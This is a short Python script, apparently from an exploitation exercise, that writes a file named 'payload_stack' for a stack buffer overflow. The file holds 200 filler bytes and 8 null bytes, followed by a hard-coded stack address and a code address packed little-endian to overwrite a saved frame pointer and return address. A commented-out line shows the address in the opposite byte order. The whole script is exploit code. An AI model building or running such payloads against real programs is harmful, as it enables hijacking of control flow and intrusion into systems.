v = b"\xFF" * 200 + b"\x00" * 8
v += b"\x20\xde\xff\xff" + b"\xff\x7f\x00\x00"
#v += b"\x00\x40\x11\xfa" 
v += b"\xfa\x11\x40\x00"
with open("payload_stack", "wb") as binfile:
    binfile.write(v)
